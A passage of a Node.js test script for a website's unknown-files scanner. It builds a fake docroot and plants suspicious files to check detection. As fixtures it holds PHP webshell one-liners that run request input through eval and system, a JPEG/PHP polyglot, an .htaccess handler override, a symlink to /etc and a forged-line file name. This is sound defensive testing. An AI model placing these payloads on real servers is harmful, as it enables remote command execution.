#!/usr/bin/env node
// UNKNOWN FILES — the checks that keep the "which files do we not recognise" tools honest.
//
//   npm run test:unknown-files                 every section
//   node scripts/unknown-files-test.mjs --section live       one section
//
// SECTIONS
//   live      the LIVE-SERVER scanner (scripts/live-files-scan.mjs), the expected-files manifest
//             (scripts/make-expected-manifest.mjs) and the one-shot VPS job (ops/live-files-scan.compose.json),
//             proven on a FAKE DOCROOT built here from the repo's public/ + dropin/ at a commit (git archive,
//             so other people's uncommitted edits cannot move it), a foreign-build storefront, and a
//             /docker/sporta-shaped tree around it (private/, backups/, releases/, loose files, old copies).
//             Needs git and a clone with the history; chown-based checks need root and say so when skipped.
//   verify    the shapes an independent verifier planted and the first detector set missed (callback injection, stream
//             includes, handler overrides in .htaccess / ini, install hooks in package.json, hooks in .claude/settings.json,
//             skimmer shapes in shipped JS, Trojan Source, lookalike file names, pasted passwords in scripts/ ...), with
//             negative controls and a mutation per detector
//   repo      the REPO-side scanner (scripts/unknown-files-scan.mjs, rules in ops/known-files.json): working tree,
//             staged package and git history, proven on a scratch git copy of the tree with planted files, a
//             scratch history, a fake staged package and the real tree (see the repo section below).
//
// WHAT "live" PROVES
//   1. the manifest is a pure function of a commit and its mapping/skip/setup lists equal the deploy's own
//   2. the clean fake docroot scans with ZERO findings, and every file is KNOWN with a named rule
//   3. every planted unknown is found with the verdict, flags and reach/exec facts they should have,
//      and NOTHING ELSE is flagged (the known files stay unflagged)
//   4. privacy: credential-looking files and everything under private/ (but the photo mount and small
//      non-credential files) are never opened; no sentinel secret and no secret value reaches the output
//   5. the output fits a 300-entry log, pages cover every finding exactly once, details files round-trip
//   6. the compose job: read-only mount, no network, no forbidden words, embeds the exact script and
//      manifest, and its own command line runs end to end against the fake docroot
//   7. the scanner's reference walk reaches exactly what scripts/old-files-inventory.mjs reaches
//   8. MUTATIONS: each detector is blinded in a copy of the scanner and the matching check must fail
//
// No ports, no database, no shared rig, no dist/. Everything is created under os.tmpdir() and removed.
import { execFileSync, spawnSync } from 'node:child_process'
import fs from 'node:fs'
import os from 'node:os'
import path from 'node:path'
import crypto from 'node:crypto'
import { fileURLToPath, pathToFileURL } from 'node:url'

const HERE = path.dirname(fileURLToPath(import.meta.url))
const WEB = path.join(HERE, '..')
const REPO = path.join(WEB, '..')
const SCANNER = path.join(HERE, 'live-files-scan.mjs')
const argv = process.argv.slice(2)
const wanted = argv.includes('--section') ? argv[argv.indexOf('--section') + 1] : 'all'
const IS_ROOT = typeof process.getuid === 'function' && process.getuid() === 0

let fails = 0, passes = 0
const ok = (m) => { passes++; console.log(`ok   ${m}`) }
const bad = (m, d = '') => { fails++; console.log(`FAIL ${m}${d ? `  -- ${d}` : ''}`) }
const check = (cond, m, d) => (cond ? ok(m) : bad(m, d))
const skipped = []

const scan = await import(pathToFileURL(SCANNER).href)
const gen = await import(pathToFileURL(path.join(HERE, 'make-expected-manifest.mjs')).href)
const TMP = fs.mkdtempSync(path.join(os.tmpdir(), 'unknown-files-'))
// UNKNOWN_FILES_KEEP=1 leaves the fake docroots behind for a look (clean/, planted/, flood/ under the printed folder).
process.on('exit', () => { if (process.env.UNKNOWN_FILES_KEEP) { console.log(`kept ${TMP}`); return } try { fs.rmSync(TMP, { recursive: true, force: true }) } catch { /* best effort */ } })

// ---------------------------------------------------------------- fake docroot
const BASE_MS = Date.UTC(2026, 10, 3, 10, 48, 53) - 86400 * 1000      // a day before the last deploy
const DEPLOY_NAME = 'deploy-20261103T104853Z-8bf6001'
const DEPLOY_MS = Date.UTC(2026, 10, 3, 10, 48, 53)
const SENTINEL = 'SENTINEL_NEVER_PRINT_8841'
const FAKE_AWS = 'AKIAIOSFODNN7EXAMPLE'                              // the example key from AWS's own documentation
const CAPTURE = process.env.UNKNOWN_FILES_LIVE_CAPTURE
  ?? '/tmp/claude-0/-home-user-wain/a128f64c-8c94-5bf5-b35a-38b83867e084/scratchpad/scan-words/live'
const B = {
  jpeg: (n = 600) => Buffer.concat([Buffer.from([0xff, 0xd8, 0xff, 0xe0, 0, 0x10, 0x4a, 0x46, 0x49, 0x46, 0, 1]), Buffer.alloc(n, 0x11)]),
  png: (n = 400) => Buffer.concat([Buffer.from([0x89, 0x50, 0x4e, 0x47, 0x0d, 0x0a, 0x1a, 0x0a]), Buffer.alloc(n, 0x22)]),
  webp: (n = 400) => Buffer.concat([Buffer.from('RIFF'), Buffer.from([0x90, 1, 0, 0]), Buffer.from('WEBP'), Buffer.alloc(n, 0x33)]),
  elf: () => Buffer.concat([Buffer.from([0x7f, 0x45, 0x4c, 0x46, 2, 1, 1, 0]), Buffer.alloc(200, 0x44)]),
  zip: () => Buffer.concat([Buffer.from('PK\x03\x04', 'latin1'), Buffer.alloc(300, 0x55)]),
  gz: () => Buffer.concat([Buffer.from([0x1f, 0x8b, 8, 0]), Buffer.alloc(300, 0x66)]),
}
const mk = (R, rel, mode = 0o755, uid) => {
  const abs = path.join(R, rel)
  fs.mkdirSync(abs, { recursive: true })
  fs.chmodSync(abs, mode)
  if (uid !== undefined && IS_ROOT) fs.chownSync(abs, uid, uid)
  return abs
}
function put(R, rel, data, { mode = 0o644, uid, gid, mtime = BASE_MS } = {}) {
  const abs = path.join(R, rel)
  fs.mkdirSync(path.dirname(abs), { recursive: true })
  fs.writeFileSync(abs, data)
  fs.chmodSync(abs, mode)
  if (uid !== undefined && IS_ROOT) fs.chownSync(abs, uid, gid ?? uid)
  fs.utimesSync(abs, mtime / 1000, mtime / 1000)
  return abs
}
const siteUid = (rel) => (/^(?:api|knet|pay)\//.test(rel) ? 0 : 501)   // a deploy job writes as root, the Mac upload was uid 501

// A foreign-build storefront: an index.html that links an entry chunk, preloads, add-ons and the manifest;
// chunks that import and lazy-load one another; one chunk nothing references is added by the plants.
function foreignBuild(R) {
  const chunks = ['index-BtzlNXGI', 'react-vendor-2UVnbCOT', 'Shop-hSBJtlix', 'Cart-1vODx36D', 'Checkout-dmHEX62-', 'api-BR6g486R', 'Admin-vmvSQvXS']
  // spelled in pieces so scripts/file-names-test.mjs does not read these fixture strings as real imports
  const IMP = 'imp' + 'ort'
  const js = (n) => `${IMP}"./react-vendor-2UVnbCOT.js";const a=()=>${IMP}("./Shop-hSBJtlix.js"),b=()=>${IMP}("./Cart-1vODx36D.js"),c=()=>${IMP}("./Checkout-dmHEX62-.js");export{a,b,c,"${n}"};`
  put(R, 'site/index.html', `<!doctype html><html lang="ar" dir="rtl"><head><meta charset="utf-8"><title>Sporta</title>
<link rel="icon" href="/favicon.png"><link rel="manifest" href="/site.webmanifest">
<link rel="stylesheet" href="/assets/index-CdcKvZhs.css"><link rel="stylesheet" href="/sporta-grid.css">
<script type="module" crossorigin src="/assets/index-BtzlNXGI.js"></script>
<link rel="modulepreload" href="/assets/react-vendor-2UVnbCOT.js"><link rel="modulepreload" href="/assets/api-BR6g486R.js">
</head><body><div id="root"></div><script src="/boot.js"></script><script defer src="/sporta-features.js"></script></body></html>`, { uid: 501 })
  put(R, 'site/assets/index-CdcKvZhs.css', 'body{margin:0}@font-face{font-family:p;src:url(/fonts/plex-400-latin.woff2)}', { uid: 501 })
  for (const c of chunks.slice(0, 6)) put(R, `site/assets/${c}.js`, js(c), { uid: 501 })
  put(R, 'site/assets/Admin-vmvSQvXS.js', 'export default 1', { uid: 501 })
  // the admin chunk is reached by a lazy import from the entry chunk
  put(R, 'site/assets/api-BR6g486R.js', `export const x=()=>${IMP}("./Admin-vmvSQvXS.js")`, { uid: 501 })
}

// Everything at the manifest's commit, laid out the way vps-deploy.mjs would have, plus the live-only parts.
function buildFake(R, sha, { capture = true } = {}) {
  const tree = fs.mkdtempSync(path.join(TMP, 'tree-'))
  const tarBuf = execFileSync('git', ['-C', REPO, 'archive', sha, 'sporta-web/public', 'sporta-web/dropin'], { maxBuffer: 1 << 28 })
  execFileSync('tar', ['-x', '-C', tree], { input: tarBuf })
  fs.mkdirSync(path.join(R, 'site'), { recursive: true })
  const walkTree = (dir, base, out = []) => { for (const e of fs.readdirSync(dir, { withFileTypes: true })) { const p = path.join(dir, e.name); if (e.isDirectory()) walkTree(p, base, out); else if (e.isFile()) out.push(path.relative(base, p).split(path.sep).join('/')) } return out }
  const pub = path.join(tree, 'sporta-web', 'public')
  for (const rel of walkTree(pub, pub)) {
    if (gen.SETUP_TOOLS.includes(rel)) continue                       // never deployed
    put(R, `site/${rel}`, fs.readFileSync(path.join(pub, rel)), { uid: siteUid(rel) })
  }
  for (const [from, to] of gen.BUNDLES) {
    const src = path.join(tree, 'sporta-web', 'dropin', from)
    for (const rel of walkTree(src, src)) {
      if (gen.SKIP.includes(rel.split('/').pop()) || gen.SETUP_TOOLS.includes(`${to}/${rel}`)) continue
      put(R, `site/${to}/${rel}`, fs.readFileSync(path.join(src, rel)), { uid: 0 })
    }
  }
  // the build fills the CSP script hashes into the root .htaccess
  const ht = fs.readFileSync(path.join(R, 'site/.htaccess'), 'utf8')
  if (!ht.includes('__SCRIPT_HASHES__')) throw new Error('public/.htaccess lost its __SCRIPT_HASHES__ placeholder; the normalised-hash rule needs a new fixture')
  put(R, 'site/.htaccess', ht.replace('__SCRIPT_HASHES__', `'sha256-${'A'.repeat(43)}=' 'sha256-${'B'.repeat(43)}='`), { uid: 0 })
  foreignBuild(R)
  let usedCapture = false
  if (capture && fs.existsSync(path.join(CAPTURE, 'index.html'))) {
    // the real foreign build captured from the live site (a Workflow scratch folder): same checks, real bytes
    fs.rmSync(path.join(R, 'site/assets'), { recursive: true, force: true })
    for (const rel of walkTree(CAPTURE, CAPTURE)) {
      if (rel.startsWith('api/')) continue                            // captured API answers, not files on disk
      put(R, `site/${rel}`, fs.readFileSync(path.join(CAPTURE, rel)), { uid: siteUid(rel) })
    }
    usedCapture = true
  }
  put(R, 'site/.well-known/acme-challenge/tok_AbC123xyz-QWERTY', 'tok_AbC123xyz-QWERTY.thumbprint', { uid: 0 })
  // ---- private/ (names, modes, owners; the sentinel sits where nobody may read it)
  put(R, 'private/api-config.php', `<?php return ['cron_key' => '${SENTINEL}'];`, { mode: 0o440, uid: 0, gid: 33 })
  mk(R, 'private/config', 0o700, 33)
  for (const f of ['knet-config.php', 'pay-config.php']) put(R, `private/config/${f}`, `<?php return ['password' => '${SENTINEL}'];`, { mode: 0o600, uid: 33 })
  for (const f of ['db_name', 'db_user', 'db_pass']) put(R, `private/${f}`, SENTINEL, { mode: 0o600, uid: 33 })
  mk(R, 'private/mail', 0o550, 0)
  put(R, 'private/mail/password', SENTINEL, { mode: 0o440, uid: 0, gid: 33 })
  mk(R, 'private/bin', 0o750, 0)
  for (const f of ['db-backup.sh', 'db-restore-test.sh']) put(R, `private/bin/${f}`, '#!/bin/sh\nexit 0\n', { mode: 0o750, uid: 0 })
  mk(R, 'private/backup-secrets', 0o700, 0)
  put(R, 'private/backup-secrets/db-backup.key', SENTINEL, { mode: 0o400, uid: 0 })
  mk(R, 'private/backups', 0o700, 0)
  put(R, 'private/backups/sporta-db-20261103T020000Z.sql.gz.enc', SENTINEL, { mode: 0o600, uid: 0 })
  put(R, 'private/backups/sporta-db-20261103T020000Z.sql.gz.enc.sha256', 'abc  sporta-db.enc\n', { mode: 0o600, uid: 0 })
  put(R, 'private/backups/last-status', 'ok 1793000000 0\n', { mode: 0o600, uid: 0 })
  mk(R, 'private/voice', 0o755, 33)
  put(R, 'private/voice/knet-payments.log', `${SENTINEL}\n`, { mode: 0o600, uid: 33 })
  put(R, 'private/voice/tts-cache/ab12cd.mp3', Buffer.alloc(900, 7), { mode: 0o644, uid: 33 })
  const deny = '<FilesMatch "\\.(php|phtml|phar)$">\n  Require all denied\n</FilesMatch>\n'
  for (const [sub, f, kind] of [['products', 'p1.jpg', 'jpeg'], ['cats', 'c1.png', 'png'], ['hero', 'h1.webp', 'webp']]) {
    mk(R, `private/media/${sub}`, 0o755, 0)
    put(R, `private/media/${sub}/${f}`, B[kind](), { uid: 0 })
    put(R, `private/media/${sub}/.htaccess`, deny, { uid: 0 })
  }
  put(R, 'private/media/products/responsive/p1-320.webp', B.webp(), { uid: 0 })
  // ---- backups/ releases/ and the loose neighbours
  mk(R, 'backups', 0o700, 0)
  put(R, `backups/${DEPLOY_NAME}.tar.gz`, B.gz(), { mode: 0o600, uid: 0, mtime: DEPLOY_MS - 5000 })
  put(R, `backups/${DEPLOY_NAME}.json`, '{"ref":"x"}', { mode: 0o600, uid: 0, mtime: DEPLOY_MS - 5000 })
  put(R, 'backups/site-pre-repo-deploy-20261031T1345Z/index.html', '<html></html>', { mode: 0o600, uid: 0 })
  put(R, `releases/${DEPLOY_NAME}.json`, '{"ref":"x","files":3}', { uid: 0, mtime: DEPLOY_MS })
  put(R, 'Dockerfile', 'FROM php:8.4-apache\n', { uid: 0 })
  put(R, 'apache-service.override.yml', `services: {}\n# ${SENTINEL}\n`, { mode: 0o640, uid: 0 })
  put(R, 'site-prev-20261030T0905Z/index.html', '<html></html>', { uid: 501 })
  put(R, 'site-prev-20261030T0905Z/api/api.php', '<?php // old copy', { uid: 501 })
  put(R, 'staging/hero-20261031/a.webp', B.webp(), { uid: 0 })
  put(R, 'rollback/x.txt', 'x', { uid: 0 })
  put(R, 'php/92-sporta-errors.ini', 'display_errors=Off\n', { uid: 0 })
  return { usedCapture }
}

// ---------------------------------------------------------------- the plants, and what each must look like
// Each plant: apply(R) writes it; test(rec, res) says whether the scanner saw it the way it should.
const flagsOf = (r) => r?.flags?.map((f) => f.name) ?? []
const has = (r, ...names) => names.every((n) => flagsOf(r).includes(n))
const PLANTS = [
  { id: 'shell-in-images', area: 'site', path: 'images/shell.php', apply: (R) => put(R, 'site/images/shell.php', "<?php @eval($_POST['x']);", { uid: 33 }),
    test: (r) => r?.verdict === 'SUSPICIOUS' && r.sev === 'high' && r.reach === true && r.exec === 'php' && has(r, 'executable-in-web-root', 'sig:php-eval-request') && r.kind === 'webshell-or-obfuscated-code' },
  { id: 'signature-hit', area: 'site', path: 'images/shell.php', test: (r) => !!r?.sigs.some((s) => s.name === 'php-eval-request' && s.line === 1) },
  { id: 'media-dir-no-htaccess', area: 'media', path: 'media/cats/', apply: (R) => fs.rmSync(path.join(R, 'private/media/cats/.htaccess')),
    test: (r) => r?.verdict === 'UNKNOWN' && has(r, 'media-dir-without-php-deny') && r.sev === 'medium' },
  { id: 'php-in-media', area: 'media', path: 'media/products/avatar.php', apply: (R) => put(R, 'private/media/products/avatar.php', "<?php system($_GET['c']);", { uid: 33 }),
    test: (r) => r?.verdict === 'SUSPICIOUS' && has(r, 'php-in-media-folder') && r.sev === 'high' },
  { id: 'world-writable-dir', area: 'site', path: 'tmp-upload', apply: (R) => { mk(R, 'site/tmp-upload', 0o777, 501); put(R, 'site/tmp-upload/readme.txt', 'x', { uid: 501 }) },
    test: (r) => r?.verdict === 'SUSPICIOUS' && has(r, 'world-writable-dir') && r.sev === 'high' && r.type === 'directory' },
  { id: 'dump-in-site', area: 'site', path: 'backup-20261101.sql', apply: (R) => put(R, 'site/backup-20261101.sql', '-- MySQL dump 10.13\nINSERT INTO orders VALUES (1);\n', { uid: 501 }),
    test: (r) => r?.verdict === 'SUSPICIOUS' && has(r, 'sql-dump') && r.reach === false && r.sev === 'medium' && r.kind === 'binary-or-archive' },
  { id: 'foreign-index-php', area: 'site', path: 'index.php', apply: (R) => put(R, 'site/index.php', "<?php echo 'old site';", { uid: 501 }),
    test: (r) => r?.verdict === 'SUSPICIOUS' && r.reach === true && r.exec === 'php' && has(r, 'executable-in-web-root') },
  { id: 'fresh-php', area: 'site', path: 'cache-9f2.php', apply: (R) => put(R, 'site/cache-9f2.php', '<?php // cache', { uid: 33, mtime: DEPLOY_MS + 2 * 3600 * 1000 }),
    test: (r) => r?.verdict === 'SUSPICIOUS' && has(r, 'newer-than-last-deploy', 'executable-in-web-root') && r.age > 3600 * 1000 },
  { id: 'symlink-escape', area: 'site', path: 'uploads-link', apply: (R) => fs.symlinkSync('/etc', path.join(R, 'site/uploads-link')),
    test: (r) => r?.verdict === 'SUSPICIOUS' && has(r, 'symlink-escapes-root') && r.sev === 'high' && r.type === 'symlink' },
  { id: 'symlink-inside', area: 'site', path: 'assets-alias', apply: (R) => fs.symlinkSync('assets', path.join(R, 'site/assets-alias')),
    test: (r) => r?.verdict === 'UNKNOWN' && has(r, 'symlink-inside') && r.sev === 'low' },
  { id: 'orphan-chunk', area: 'site', path: 'assets/Old-ZxCvB123.js', apply: (R) => put(R, 'site/assets/Old-ZxCvB123.js', 'export default 0', { uid: 501 }),
    test: (r) => r?.verdict === 'UNKNOWN' && has(r, 'unreferenced-chunk') && r.sev === 'low' && r.kind === 'orphan' },
  { id: 'dot-git', area: 'site', path: '.git', apply: (R) => { put(R, 'site/.git/HEAD', 'ref: refs/heads/main\n', { uid: 501 }); put(R, 'site/.git/config', '[core]\n', { uid: 501 }) },
    test: (r) => r?.verdict === 'SUSPICIOUS' && has(r, 'vcs-metadata') && r.reach === false && r.sev === 'high' },
  { id: 'setuid', area: 'site', path: 'helper.bin', apply: (R) => { const p = put(R, 'site/helper.bin', B.elf(), { uid: 501 }); fs.chmodSync(p, 0o4755) },
    test: (r) => r?.verdict === 'SUSPICIOUS' && has(r, 'setuid', 'executable-binary') && r.type === 'ELF' },
  { id: 'wrong-uid', area: 'site', path: 'notes-4242.txt', needsRoot: true, apply: (R) => put(R, 'site/notes-4242.txt', 'plain', { uid: 4242 }),
    test: (r) => r?.verdict === 'UNKNOWN' && has(r, 'uid-unexpected:4242') && r.sev === 'low' },
  { id: 'log-in-web-root', area: 'site', path: 'knet-payments.log', apply: (R) => put(R, 'site/knet-payments.log', '2026-11-03 track=1 amount=3.500\n', { uid: 501 }),
    test: (r) => r?.verdict === 'SUSPICIOUS' && has(r, 'log-in-web-root') && r.reach === false && r.sev === 'medium' && r.kind === 'secret' },
  { id: 'archive', area: 'site', path: 'site-dist.zip', apply: (R) => put(R, 'site/site-dist.zip', B.zip(), { uid: 501 }),
    test: (r) => r?.verdict === 'SUSPICIOUS' && has(r, 'archive') && r.type === 'ZIP' && r.reach === false },
  { id: 'editor-copy', area: 'site', path: 'config.js.bak', apply: (R) => put(R, 'site/config.js.bak', 'window.SPORTA_CONFIG={}', { uid: 501 }),
    test: (r) => r?.verdict === 'UNKNOWN' && has(r, 'editor-copy') && r.kind === 'stale-copy' && r.reach === false },
  { id: 'secret-shaped', area: 'site', path: 'config.php', apply: (R) => put(R, 'site/config.php', `<?php return ['k' => '${SENTINEL}'];`, { uid: 501 }),
    test: (r) => r?.verdict === 'SUSPICIOUS' && has(r, 'secret-shaped-name') && r.sha === null && /not opened/.test(r.type) && r.kind === 'secret' },
  { id: 'aws-key-in-text', area: 'site', path: 'api/notes.txt', apply: (R) => put(R, 'site/api/notes.txt', `key = ${FAKE_AWS}\n-----BEGIN RSA PRIVATE KEY-----\nxx\n`, { uid: 501 }),
    test: (r) => r?.verdict === 'SUSPICIOUS' && r.sigs.some((s) => s.name === 'secret-aws-key' && s.mask === 'AKIA****' && s.line === 1) && r.sigs.some((s) => s.name === 'secret-private-key' && s.mask === 'PEM-block' && s.line === 2) },
  { id: 'dsstore', area: 'site', path: '.DS_Store', apply: (R) => put(R, 'site/.DS_Store', Buffer.alloc(40, 1), { uid: 501 }),
    test: (r) => r?.verdict === 'UNKNOWN' && has(r, 'dotfile') && r.reach === false },
  { id: 'appledouble', area: 'site', path: '._boot.js', apply: (R) => put(R, 'site/._boot.js', Buffer.alloc(40, 2), { uid: 501 }),
    test: (r) => r?.verdict === 'UNKNOWN' && has(r, 'dotfile') && r.reach === false },
  { id: 'polyglot', area: 'site', path: 'cats/polyglot.jpg', apply: (R) => put(R, 'site/cats/polyglot.jpg', Buffer.concat([B.jpeg(40), Buffer.from("<?php system($_GET['x']); ?>")]), { uid: 501 }),
    test: (r) => r?.verdict === 'SUSPICIOUS' && has(r, 'php-in-non-php-file') && r.sigs.some((s) => s.name === 'php-exec-request') },
  { id: 'owner-photo-ok', area: 'site', path: 'cats/owner-new.jpg', apply: (R) => put(R, 'site/cats/owner-new.jpg', B.jpeg(), { uid: 501 }),
    test: (r) => r?.verdict === 'KNOWN' && r.rule === 'owner-photo' && r.flags.length === 0, known: true },
  { id: 'modified-api-code', area: 'site', path: 'api/birthday.php', apply: (R) => fs.appendFileSync(path.join(R, 'site/api/birthday.php'), '\n<?php // appended by hand\n'),
    test: (r) => r?.verdict === 'SUSPICIOUS' && has(r, 'known-path-modified-code') && r.sev === 'high' },
  { id: 'extra-api-php', area: 'site', path: 'api/extra-helper.php', apply: (R) => put(R, 'site/api/extra-helper.php', '<?php echo 1;', { uid: 0 }),
    test: (r) => r?.verdict === 'SUSPICIOUS' && r.reach === true && has(r, 'executable-in-web-root') },
  { id: 'setup-tool-html', area: 'site', path: 'go-live.html', apply: (R, ctx) => put(R, 'site/go-live.html', fs.readFileSync(path.join(ctx.tree, 'sporta-web/public/go-live.html')), { uid: 501 }),
    test: (r) => r?.verdict === 'SUSPICIOUS' && has(r, 'leftover-setup-tool') && r.rule === 'setup-tool' },
  { id: 'setup-tool-php', area: 'site', path: 'api/setup-admin.php', apply: (R, ctx) => put(R, 'site/api/setup-admin.php', fs.readFileSync(path.join(ctx.tree, 'sporta-web/dropin/php-store/setup-admin.php')), { uid: 0 }),
    test: (r) => r?.verdict === 'SUSPICIOUS' && has(r, 'leftover-setup-tool') },
  { id: 'ht-handler', area: 'site', path: 'cats/.htaccess', apply: (R) => put(R, 'site/cats/.htaccess', 'AddType application/x-httpd-php .jpg\n', { uid: 501 }),
    test: (r) => r?.verdict === 'SUSPICIOUS' && r.sigs.some((s) => s.name === 'ht-handler') },
  { id: 'listing-open', area: 'site', path: 'docs', apply: (R) => { put(R, 'site/docs/.htaccess', 'Options +Indexes\n', { uid: 501 }); put(R, 'site/docs/a.txt', 'a', { uid: 501 }) },
    test: (r) => r?.verdict === 'UNKNOWN' && has(r, 'listing-open') && r.type === 'directory' },
  { id: 'tmp-upload-readme', area: 'site', path: 'tmp-upload/readme.txt', test: (r) => r?.verdict === 'UNKNOWN', collateral: true },
  { id: 'docs-htaccess', area: 'site', path: 'docs/.htaccess', test: (r) => r?.verdict === 'UNKNOWN', collateral: true },
  { id: 'docs-a', area: 'site', path: 'docs/a.txt', test: (r) => r?.verdict === 'UNKNOWN', collateral: true },
  { id: 'dump-readable', area: 'private', path: 'backups/leak.sql.gz', apply: (R) => put(R, 'private/backups/leak.sql.gz', B.gz(), { mode: 0o644, uid: 0 }),
    test: (r) => r?.verdict === 'UNKNOWN' && has(r, 'world-readable') && r.kind === 'permissions' },
  { id: 'stale-config-copy', area: 'private', path: 'api-config.prev-20261031.php', apply: (R) => put(R, 'private/api-config.prev-20261031.php', SENTINEL, { mode: 0o640, uid: 0 }),
    test: (r) => r?.verdict === 'UNKNOWN' && r.kind === 'stale-copy' && r.sev === 'medium' && /not opened/.test(r.type) },
  { id: 'private-stray', area: 'private', path: 'notes.txt', apply: (R) => put(R, 'private/notes.txt', 'x', { uid: 0 }),
    test: (r) => r?.verdict === 'UNKNOWN' && has(r, 'not-explained') },
  { id: 'backup-dump-readable', area: 'backups', path: 'claude-20261031T1515Z/orders-stock.sql.gz', apply: (R) => put(R, 'backups/claude-20261031T1515Z/orders-stock.sql.gz', B.gz(), { mode: 0o644, uid: 0 }),
    test: (r) => r?.verdict === 'KNOWN' && r.rule === 'bk-session' && has(r, 'world-readable') && r.sev === 'medium' },
  { id: 'backup-credential-copy', area: 'backups', path: 'claude-20261031T1325Z/api-config.php', apply: (R) => put(R, 'backups/claude-20261031T1325Z/api-config.php', SENTINEL, { mode: 0o440, uid: 0, gid: 33 }),
    test: (r) => r?.verdict === 'KNOWN' && has(r, 'credential-copy') && /not opened/.test(r.type) },
  { id: 'backups-dir-open', area: 'backups', path: './', apply: (R) => fs.chmodSync(path.join(R, 'backups'), 0o755),
    test: (r) => r?.verdict === 'UNKNOWN' && has(r, 'world-readable-dir') && r.sev === 'medium' && r.kind === 'permissions' },
  { id: 'backup-folder-summary', area: 'backups', path: 'claude-20261031T1515Z/', test: (r) => r?.verdict === 'KNOWN' && r.rule === 'bk-session', collateral: true },
  { id: 'backup-folder-summary2', area: 'backups', path: 'claude-20261031T1325Z/', test: (r) => r?.verdict === 'KNOWN' && r.rule === 'bk-session', collateral: true },
  { id: 'old-copy-git', area: 'copy', path: 'site-prev-20261030T0905Z/', apply: (R) => put(R, 'site-prev-20261030T0905Z/.git/HEAD', 'ref\n', { uid: 501 }),
    test: (r) => r?.verdict === 'KNOWN' && r.rule === 'copy-site-old' && r.flags.some((f) => f.name === 'vcs-metadata') },
  { id: 'top-stray', area: 'top', path: 'shell.sh', apply: (R) => put(R, 'shell.sh', '#!/bin/sh\n', { mode: 0o755, uid: 0 }),
    test: (r) => r?.verdict === 'UNKNOWN' && r.exec === 'script' },
  { id: 'top-unknown-dir', area: 'copy', path: 'mystery-dir/', apply: (R) => put(R, 'mystery-dir/a.txt', 'a', { uid: 0 }),
    test: (r) => r?.verdict === 'UNKNOWN' && has(r, 'not-explained') },
  { id: 'fifo', area: 'site', path: 'pipe.fifo', apply: (R) => { const r = spawnSync('mkfifo', [path.join(R, 'site/pipe.fifo')]); if (r.status !== 0) throw new Error('mkfifo failed') },
    test: (r) => r?.verdict === 'SUSPICIOUS' && has(r, 'special-file') && r.sev === 'high' && /not opened/.test(r.type) },
  { id: 'forged-line', area: 'site', path: 'evil\nF H KNOWN forged.txt', apply: (R) => put(R, 'site/evil\nF H KNOWN forged.txt', 'x', { uid: 501 }),
    test: (r, res) => r?.verdict === 'UNKNOWN' && !res.__lines.join('\n').split('\n').some((l) => l.startsWith('F H KNOWN')) },
]
const planted = (R, tree) => { for (const p of PLANTS) if (p.apply && (IS_ROOT || !p.needsRoot)) p.apply(R, { tree }) }
const findRec = (res, area, p) => res.records.find((r) => r.area === area && r.path === p)

// ---------------------------------------------------------------- running the scanner
const runCli = (args, env = {}) => spawnSync(process.execPath, [SCANNER, ...args], { encoding: 'utf8', maxBuffer: 64 * 1024 * 1024, timeout: 120000, env: { ...process.env, ...env } })
const lines = (t) => t.split('\n').filter((l, i, a) => l.length || i < a.length - 1)

async function liveSection() {
  console.log('\n== live: manifest')
  const m = gen.buildManifest('HEAD')
  const m2 = gen.buildManifest('HEAD')
  check(gen.manifestJson(m) === gen.manifestJson(m2), 'the manifest is a pure function of the commit (two builds, identical bytes)')
  check(/^[0-9a-f]{40}$/.test(m.sha) && m.hashLen === 16 && m.paths.every(([, , ...h]) => h.length > 0 && h.every((x) => /^[0-9a-f]{16}$/.test(x))), `every manifest path carries 16-hex blob ids (${m.paths.length} paths, ${m.paths.reduce((n, p) => n + p.length - 2, 0)} versions at ${m.sha.slice(0, 8)})`)
  // the mapping and the skip/setup/media lists equal the deploy's own source text
  const vps = fs.readFileSync(path.join(HERE, 'vps-deploy.mjs'), 'utf8')
  const bundle = fs.readFileSync(path.join(HERE, 'bundle-php.mjs'), 'utf8')
  const listFrom = (src, re_) => [...(re_.exec(src)?.[1] ?? '').matchAll(/'([^']+)'/g)].map((x) => x[1])
  check(JSON.stringify([...gen.SETUP_TOOLS].sort()) === JSON.stringify(listFrom(vps, /const SETUP_TOOLS = new Set\(\[([\s\S]*?)\]\)/).sort()), 'SETUP_TOOLS equals vps-deploy.mjs')
  check(JSON.stringify(gen.MEDIA) === JSON.stringify(listFrom(vps, /const MEDIA = \[([\s\S]*?)\]/)), 'MEDIA equals vps-deploy.mjs')
  check(JSON.stringify([...gen.SKIP].sort()) === JSON.stringify(listFrom(bundle, /const SKIP = new Set\(\[([\s\S]*?)\]\)/).sort()), 'SKIP equals bundle-php.mjs')
  const pairs = [...(/const BUNDLES = \[([\s\S]*?)\]\n/.exec(bundle)?.[1] ?? '').matchAll(/\['([^']+)',\s*'([^']+)'\]/g)].map((x) => [x[1], x[2]])
  check(JSON.stringify(gen.BUNDLES) === JSON.stringify(pairs), 'BUNDLES (dropin -> api/knet/pay) equals bundle-php.mjs')
  const names = new Map(m.paths.map((p) => [p[0], p[1]]))
  check(!names.has('api/config.php') && !names.has('knet/config.php') && !names.has('pay/config.php') && ![...names.keys()].some((k) => /(^|\/)README\.md$/.test(k)), 'config.php and README.md are never expected on the server (not shipped)')
  check(gen.SETUP_TOOLS.every((p) => !names.has(p) || names.get(p).includes('s')), 'every setup tool the history knows is flagged as one')
  check(names.get('.htaccess')?.includes('n') && m.norm['.htaccess']?.length >= 1, 'the root .htaccess carries normalised (CSP-folded) hashes')
  check(['api/api.php', 'knet/pay.php', 'pay/pay.php', 'boot.js'].every((p) => names.has(p)), 'the dropin -> api/knet/pay mapping and public/ files are present')
  check(m.rules.every((r) => r.id && r.area && r.re && r.verdict && r.doc && r.why && new RegExp(r.re, r.flags ?? '')), `all ${m.rules.length} documented live-only rules have id, area, regex, verdict, why and doc`)
  check(new Set(m.rules.map((r) => r.id)).size === m.rules.length, 'rule ids are unique')

  // ---- the fake docroots
  console.log('\n== live: fake docroot')
  const mfPath = path.join(TMP, 'manifest.json')
  fs.writeFileSync(mfPath, gen.manifestJson(m))
  const manifest = JSON.parse(gen.manifestJson(m))
  const treeOf = (sha) => { const d = fs.mkdtempSync(path.join(TMP, 'plant-tree-')); execFileSync('tar', ['-x', '-C', d], { input: execFileSync('git', ['-C', REPO, 'archive', sha, 'sporta-web/public', 'sporta-web/dropin'], { maxBuffer: 1 << 28 }) }); return d }
  const CLEAN = path.join(TMP, 'clean'), PLANT = path.join(TMP, 'planted')
  fs.mkdirSync(CLEAN); fs.mkdirSync(PLANT)
  const { usedCapture } = buildFake(CLEAN, m.sha)
  buildFake(PLANT, m.sha)
  const tree = treeOf(m.sha)
  planted(PLANT, tree)
